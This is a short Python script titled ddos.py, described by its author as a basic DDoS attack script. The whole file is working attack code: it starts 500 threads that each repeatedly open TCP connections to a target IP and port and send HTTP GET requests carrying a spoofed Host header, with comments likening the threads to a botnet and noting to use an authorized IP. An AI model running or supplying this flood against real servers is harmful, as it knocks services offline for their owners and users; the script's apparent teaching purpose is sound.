"""
ddos.py
> A very inefficient & basic ddos attack script

Parv Patel
"""

import threading
import socket

# target ip (uses authorized ip!)
target = "10.0.0.1"

# attack port (80/443 http/https web, 22 ssh etc.)
port = 80

# host ip (use fake ip!)
fake_ip = '182.33.23.22'

_attacks = 0


def attack():
    while True:
        '''
        AF_INET = Internet Protocol v4 addresses, Type of addresses that your socket can communicate. 
                  Use AF_INET6 for v6 addresses
                  
        SOCK_STREAM = TCP connection-based protocol. 
        '''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        # print # of attacks to target
        global _attacks
        _attacks += 1
        if _attacks % 100 == 0:
            print(_attacks)


# Make multiple threads (analogous to botnets)
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
